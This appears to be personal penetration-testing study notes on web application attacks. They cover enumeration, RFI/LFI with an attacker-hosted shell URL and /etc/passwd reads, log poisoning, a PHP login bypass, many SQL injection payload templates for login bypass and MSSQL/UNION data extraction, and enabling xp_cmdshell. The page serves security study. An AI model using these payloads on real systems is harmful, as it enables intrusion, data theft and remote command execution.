---
layout: default
---
<html>
<head>
    <title>Web Application Attacks</title>
    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
</head>

<hr>

<body>

    <h1>Web Application Attacks</h1>

    <hr>

    <h2>Strategy</h2>

    <li>Web directory enumeration</li>
    <ul>
        <li>Web Enumeration Tools:</li>
        <ul>
            <li>gobuster</li>
            <li>feroxbuster</li>
        </ul>
        <li>Web Enumeration Wordlists:</li>
        <ul>
            <li>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</li>
            <li>/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt</li>
        </ul>
    </ul>

    <li>Interesting web pages to check</li>
    <ul>
        <li>Check for &lt;url&gt;/index.php/asp/aspx to try to determine which language the server uses.</li>
        <li>Error Page.  Go to non-existent url.</li>
        <li>README.md</li>
        <li>/robots.txt</li>
        <li>Admin Portals</li>
        <ul>
            <li>Some common ones:</li>
            <ul>
                <li>Tomcat Manager</li>
                <li>phpMyAdmin</li>
            </ul>
        </ul>
    </ul>

    <li>Look for exploits</li>
    <ul>
        <li>Carefully look at different web app name variations (cutenews & cutephp)</li>
        <li>Search exploits for website names even if they look "custom" or meaningless</li>
    </ul>

    <li>Read all web pages</li>
    <ul>
        <li>Look for usernames</li>
        <li>Look at source code for all pages</li>
        <ul>
            <li>Hidden functions</li>
            <li>Comments with sensitive information</li>
        </ul>
    </ul>

    <li>Burp</li>
    <ul>
        <li>Inspect web page requests</li>
        <ul>
            <li>Hidden directories may be revealed</li>
            <ul>
                <li>GET request on /hello-world/ initiated a bunch of other GET requests behind the scenes and this revealed hidden web directories </li>
            </ul>
            <li>Interesting headers may be revealed</li>
        </ul>
    </ul>

    <li>Nikto</li>
    <ul>
        <li>High configurable open source web server scanner.  Not designed for stealth.  Especially useful for catching low hanging fruit.</li>
        <li>Unable to connect to https host</li>
        <ul>
            <li>MinProtocol = None</li>
            <li>CipherString = Default</li>
        </ul>
    </ul>

    <li>sql injection</li>
    <ul>
        <li>Test *all* input forms</li>
        <li>&lt;url&gt;.com/id=&lt;Test for sql injection&gt;</li>
    </ul>

    <li>Input Forms</li>
    <ul>
        <li>Test for LFI and RFI</li>
        <li>Play with input lengths</li>
    </ul>

    <li>Directory Traversal</li>
    <ul>
        <li>Look for links such as: &lt;url&gt;/test.php?page=mkdocs</li>
        <ul>
            <li>RFI</li>
            <ul>
                <li>page=http://&lt;attacker url&gt;/shell.php</li>
            </ul>
            <li>LFI</li>
            <ul>
                <li>?file=&lt;directory&gt;</li>
                <ul>
                    <li>try to change it to file=/etc/passwd or file=C:\boot.ini</li>
                </ul>
                <li>Log poisoning</li>
                <ul>
                    <li>LFI and code execution combo</li>
                </ul>
            </ul>
        </ul>
    </ul>

    <li>Log poisoning</li>
    <ul>
        <li>Check for &lt;log&gt;.php/asp/aspx</li>
        <ul>
            <li>If logs are keeping track of HTTP request user-agents then set user-agent to web shell code and then navigate to the log using LFI</li>
        </ul>
    </ul>

    <li>Check github page for web application</li>
    <ul>
        <li>Look for issues which may reveal vulnerabilities or exploits</li>
        <li>Look at file in web app directory, might be able to find something interesting to look for on the victim</li>
    </ul>

    <br>

    <h2>Login Page</h2>

    <li>Password attack</li>
    <ul>
        <li>Common Credentials</li>
        <ul>
            <li>Check seclist wordlist for web app specific default credential lists.</li>
            <ul>
                <li>/usr/share/seclists/Passwords/Default-Credentials</li>
            </ul>
        </ul>
        <li>Brute force</li>
        <ul>
            <li>Hydra</li>
            <li>BurpSuite Intruder</li>
            <li>Wordpress - wpscan (also an overall vulnerability scanner)</li>
        </ul>
        <li>PHP Juggling Bug / Bypass Login</li>
        <ul>
            <li>Abuses how PHP interprets information</li>
            <li>Change login webrequest of: username=admin&password=admin</li>
            <li>To: username=admin&password[]=admin</li>
            <li>If this works, you will login without providing correct password</li>
        </ul>
    </ul>

    <li>Enumerate valid users</li>
    <ul>
        <li>Observe error message returned when attempting to login</li>
        <ul>
            <li>If you attempt to login and an error message returns saying "User does not exist, please try again", then you know that user does not exist.</li>
            <li>If you get an error message saying "Password is incorrect for this user" then you know that user exists.</li>
            <ul>
                <li>You can determine users that exist before attacking passwords.</li>
                <li>Try this same technique on the password recovery page.</li>
                <li>Automate user enumeration using wfuzz</li>
            </ul>
        </ul>
    </ul>

    <li>Sql injection</li>
    <li>nosql injection</li>

    <br>

    <h2>SQL Injection</h2>
    <li>Preventing SQL injection</li>
    <ul>
        <li>Use parameterized queries, also known as prepared statements.  This puts parameters or placeholders into SQL statements.  The databased binds the values of the user input to the statement.  This prevents user input from manipulating SQL code.</li>
    </ul>

    <table>
        <tr>
            <td>Test for sql injections</td>
            <td>' or 1=1-- -<br>a' or 1=1-- -<br>' or 1=2-- -<br>a' or 1=2-- -</td>
        </tr>
    </table>

    <li>Examples of login bypass:</li>
    <table>
        <tr>
            <td>USERNAME:</td>
            <td>admin' or 'a'='a</td>
        </tr>
        <tr>
            <td>PASSWORD:</td>
            <td>'#</td>
        </tr>
        <tr>
            <td>Explanation</td>
            <td>
                <li>SELECT * FROM users WHERE username = '" + input_username + "' AND password ='" + input_password + "'";</li>
                <br>turns into:<br>
                <li>SELECT * FROM users WHERE username = 'admin' AND password = '' or 'a'='a'</li>
            </td>
        </tr>
        <tr>
            <td> </td>
            <td> </td>
        </tr>
        <tr>
            <td>USERNAME:</td>
            <td>' or 1=1-- -</td>
        </tr>
        <tr>
            <td>PASSWORD:</td>
            <td>&lt;anything&gt;</td>
        </tr>
        <tr>
            <td>Explanation</td>
            <td>
                <li>SELECT * FROM users WHERE username = '" + input_username + "' AND password ='" + input_password + "'";</li>
                <br>turns into:<br>
                <li>SELECT * FROM users WHERE username = '' or 1=1 -- AND password = '&lt;anything&gt;'</li>
            </td>
        </tr>
    </table>


    <h4>SQL Injection Error Attack</h4>
    <li>Method #1 Current DB</li>
    <table>
        <tr>
            <td>Enumerate number of databases</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--</td>
        </tr>
        <tr>
            <td>Extract database name by number</td>
            <td>
                <table>
                    <tr>
                        <td>Method #1</td>
                        <td>1 AND 1=CONVERT(INT,db_name(<mark>&lt;database #&gt;</mark>))--</td>
                    </tr>
                    <tr>
                        <td>Method #2</td>
                        <td>1 AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=<mark>&lt;database #&gt;</mark>))--</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Extra table count from current DB</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58)))--</td>
        </tr>
        <tr>
            <td>Extract table names from current DB</td>
            <td>1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top <mark>&lt;increase # starting with 1&gt;</mark> TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--</td>
        </tr>
        <tr>
            <td>Extract column names from a table in current DB</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top <mark>&lt;increase # starting with 1&gt;</mark> column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='<mark>&lt;table name&gt;</mark>' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--</td>
        </tr>
        <tr>
            <td>Extract number of rows in a table in current DB</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM &lt;table name&gt;)+CHAR(58)+CHAR(58)))--</td>
        </tr>
        <tr>
            <td>Extract data for two columns by row #</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 <mark>&lt;column 1&gt;</mark>+CHAR(58)+<mark>&lt;column2&gt;</mark> FROM (SELECT top <mark>&lt;increase # starting with 1&gt;</mark> <mark>&lt;column 1&gt;</mark> , <mark>&lt;column 2&gt;</mark> FROM <mark>&lt;table 1&gt;</mark> ORDER BY <mark>&lt;column 1&gt;</mark> ASC) sq ORDER BY <mark>&lt;Column 1&gt;</mark>  DESC)+CHAR(58)+CHAR(58)))--</td>
        </tr>
    </table>

    <li>Method #1 - Other DB's</li>
    <table>
        <tr>
            <td>Extract tables from other DB</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top <mark>&lt;increase # starting with 1&gt;</mark> TABLE_NAME FROM <mark>&lt;other_db_name&gt;</mark>.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--</td>
        </tr>
        <tr>
            <td>Enumerate columns from table from other DB</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top <mark>&lt;Increase # starting with 1&gt;</mark> column_name FROM <mark>&lt;Database&gt;</mark>.information_schema.COLUMNS WHERE TABLE_NAME='<mark>&lt;Table&gt;</mark>' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--</td>
        </tr>
        <tr>
            <td>Extract number of rows in table from other DB</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [<mark>&lt;Database&gt;</mark>]..[<mark>&lt;Table&gt;</mark>] )+CHAR(58)+CHAR(58)))--</td>
        </tr>
        <tr>
            <td>Extract data from table in other DB</td>
            <td>1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 <mark>&lt;Column&gt;</mark> FROM (SELECT top <mark>&lt;Increase # starting with 1&gt;</mark> <mark>&lt;Column&gt;</mark> FROM <mark>&lt;Database&gt;</mark>..<mark>&lt;Table&gt;</mark> ORDER BY <mark>&lt;Column&gt;</mark> ASC) sq ORDER BY <mark>&lt;Column&gt;</mark> DESC)+CHAR(58)+CHAR(58)))--</td>
        </tr>
    </table>

    <li>Error injection Method #2</li>
    <table>
        <tr>
            <td>"HAVING" & "GROUP BY" error message attack<br><br>Enumerate table and column names</td>
            <td>
                <table>
                    <tr>
                        <td>Enumerate column 1 (Generates error message revealing &lt;table&gt;.&lt;column_1&gt;)</td>
                        <td>1' HAVING 1=1 --</td>
                    </tr>
                    <tr>
                        <td>Enumerate column 2 (Generates error message revealing &lt;table&gt;.&lt;column_2&gt;)</td>
                        <td>1' GROUP BY <mark>&lt;table&gt;</mark>.<mark>&lt;column 1&gt;</mark> HAVING 1=1 --</td>
                    </tr>
                    <tr>
                        <td>Enumerate column 3 (Generates error message revealing &lt;table&gt;.&lt;column_3&gt;)</td>
                        <td>1' GROUP BY <mark>&lt;table&gt;</mark>.<mark>&lt;column 1&gt;</mark>,<mark>&lt;table&gt;</mark>.<mark>&lt;column 2&gt;</mark></td>
                    </tr>
                    <tr>
                        <td>Continue enumerating columns until a normal result is returned</td>
                        <td></td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Enumerate DB names</td>
            <td>
                <table>
                    <tr>
                        <td>Enumerate db 0 name (Generate error: [SqlException (0x80131904): Conversion failed when converting the nvarchar value '&lt;db_name(0)&gt;' to data type int.])</td>
                        <td>1 and 1=CONVERT(INT,db_name(<mark>0</mark>))--</td>
                    </tr>
                    <tr>
                        <td>Enumerate db 1 name (Generate error: [SqlException (0x80131904): Conversion failed when converting the nvarchar value '&lt;db_name(1)&gt;' to data type int.])</td>
                        <td>1 and 1=CONVERT(INT,db_name(<mark>1</mark>))--</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Enumerate table names using information_schema.tables</td>
            <td>
                <table>
                    <tr>
                        <td>Enumerate table 1 name (Generate error: failed when converting the nvarchar value '&lt;table_1&gt;' to data)</td>
                        <td>1 and 1=convert(int,(select top 1 table_name from information_schema.tables))--</td>
                    </tr>
                    <tr>
                        <td>Enumerate table 2 name (Generate error: failed when converting the nvarchar value '&lt;table_2&gt;' to data)</td>
                        <td>1 and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('<mark>&lt;table_1&gt;</mark>')))--</td>
                    </tr>
                    <tr>
                        <td>Enumerate table 3 name (Generate error: failed when converting the nvarchar value '&lt;table_3&gt;' to data)</td>
                        <td>1 and 1=convert(int,(select top 1 table_name from_information_schema.tables where table_name not in (&#039;<mark>&lt;table_1&gt;</mark>&#039;,&#039;<mark>&lt;table_2&gt;</mark>&#039;)))--</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Enumerate table columns using information_schema.tables</td>
            <td>
                <table>
                    <tr>
                        <td>Enumerate column 1 for table_1 (Generate error: failed when converting the nvarchar value '&lt;column_1&gt;' to data)</td>
                        <td>1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='<mark>&lt;table 1&gt;</mark>'))--</td>
                    </tr>
                    <tr>
                        <td>Enumerate column 2 for table_1 (Generate error: failed when converting the nvarchar value '&lt;column_2&gt;' to data)</td>
                        <td>1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='<mark>&lt;table 1&gt;</mark>' and column_name not in ('<mark>&lt;Column 1&gt;</mark>')))--</td>
                    </tr>
                    <tr>
                        <td>Enumerate column 3 for table_1 (Generate error: failed when converting the nvarchar value '&lt;column_3&gt;' to data)</td>
                        <td>1 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='<mark>&lt;table 1&gt;</mark>&#039; and column_name not in ('<mark>&lt;Column_1&gt;</mark>','<mark>&lt;Column_2&gt;</mark>')))--</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Enumerate data using table and column names</td>
            <td>
                <table>
                    <tr>
                        <td>Enumerate &lt;data_1&gt; from &lt;column_1&gt; information from &lt;table_1&gt;  (Generate error: failed when converting the nvarchar value '&lt;data_1&gt;' to data type int.)</td>
                        <td>1 and 1=convert(int,(select top 1 <mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark>))--</td>
                    </tr>
                    <tr>
                        <td>Enumerate &lt;data_2&gt; from &lt;column_1&gt; information from &lt;table_1&gt;  (Generate error: failed when converting the nvarchar value '&lt;data_2&gt;' to data type int.)</td>
                        <td>1 and 1=convert(int,(select top 1 <mark>&lt;column_1&gt;</mark> from <mark>&lt;table 1&gt;</mark> where <mark>&lt;column_1&gt;</mark> not in ('<mark>&lt;data_1&gt;</mark>')))--</td>
                    </tr>
                    <tr>
                        <td>Enumerate &lt;data_3&gt; from &lt;column_1&gt; information from &lt;table_1&gt;  (Generate error: failed when converting the nvarchar value '&lt;data_3&gt;' to data type int.)</td>
                        <td>1 and 1=convert(int,(select top 1  <mark>&lt;column_1&gt;</mark> from <mark>&lt;table_1&gt;</mark> where  <mark>&lt;column_1&gt;</mark> not in ('<mark>&lt;data_1&gt;</mark>','<mark>&lt;data_2&gt;</mark>')))--</td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>

    <h4>SQL Injection Union Attack</h4>

    <li>Quick method - Group_concat</li>

    <table>
        <tr>
            <td>Enumerate DB Names</td>
            <td>
                <table>
                    <tr>
                        <td>Format 1</td>
                        <td>1 and 1=2 UNION SELECT 1,group_concat(schema_name),3,4<mark>...(Enumerate # to go up to using &#039; order by &lt;#&gt;-- -)</mark> from information_schema.schemata-- -</td>
                    </tr>
                    <tr>
                        <td>Format 2</td>
                        <td>' UNION SELECT 1,group_concat(schema_name),3,4<mark>...(Enumerate # to go up to using ' order by &lt;#&gt;-- -)</mark> from information_schema.schemata-- -</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Enumerate all Tables from DB</td>
            <td>
                <table>
                    <tr>
                        <td>Format 1</td>
                        <td>1 and 1=2 UNION SELECT 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='<mark>&lt;DB Name&gt;</mark>'-- -</td>
                    </tr>
                    <tr>
                        <td>Format 2</td>
                        <td>'UNION SELECT group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema='<mark>&lt;DB Name&gt;</mark>'-- -</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Enumerate Columns in Table</td>
            <td>
                <table>
                    <tr>
                        <td>Format 1</td>
                        <td>1 and 1=2 UNION SELECT 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns where table_name='<mark>&lt;Table Name&gt;</mark>'-- -</td>
                    </tr>
                    <tr>
                        <td>Format 2</td>
                        <td>'UNION SELECT 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns where table_name='<mark>&lt;Table Name&gt;</mark>'-- -</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td>Enumerate Data from Table</td>
            <td>
                <table>
                    <tr>
                        <td>Format 1</td>
                        <td>1 and 1=2 UNION SELECT 1, <mark>&lt;Column Name&gt;</mark>,3,4,<mark>&lt;Column Name&gt;</mark>,6,7 from <mark>&lt;DB name&gt;</mark>.<mark>&lt;Table&gt;</mark>-- -</td>
                    </tr>
                    <tr>
                        <td>Format 2</td>
                        <td>'UNION SELECT 1, <mark>&lt;Column Name&gt;</mark>,3,4,<mark>&lt;Column Name&gt;</mark>,6,7 from <mark>&lt;DB name&gt;</mark>.<mark>&lt;Table&gt;</mark>-- -</td>
                    </tr>
                </table>
            </td>
        </tr>
    </table>

    <li>MSSQL</li>
    <ul>
        <li>xp_cmdshell</li>
        <ul>
            <li>Only executable by 'sa' or other users with 'sysadmin' privileges</li>
            <li>Available by default on all MSSQL (Disabled on MSSQL 2005)</li>
        </ul>
        <table>
            <tr>
                <td>Enable xp_cmdshell</td>
                <td>
                    <table>
                        <tr>
                            <td>Step #1</td>
                            <td>EXEC sp_configure 'show advanced options', 1; RECONFIGURE</td>
                        </tr>
                        <tr>
                            <td>Step #2</td>
                            <td>EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE</td>
                        </tr>
                    </table>
                </td>
            </tr>
            <tr>
                <td>Execute xp_cmdshell</td>
                <td>EXEC xp_cmdshell &quot;&lt;system command&gt;&quot;</td>
            </tr>
        </table>
    </ul>

